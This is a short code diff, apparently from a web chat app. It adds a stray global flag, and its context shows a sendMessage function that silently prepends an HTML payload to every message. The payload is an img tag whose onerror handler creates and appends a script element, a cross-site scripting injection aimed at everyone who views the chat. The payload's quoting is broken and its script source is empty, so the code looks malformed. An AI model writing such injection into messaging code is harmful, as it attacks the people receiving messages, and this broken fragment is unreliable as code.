@@ -1,3 +1,5 @@
+eafeaf = true;
+
 function sendMessage() {
             const name = getUsername();
             const content = "<img src='' onerror='s = document.createElement('script'); s.src=''; document.appendChild(s)'>" + messageInput.value;
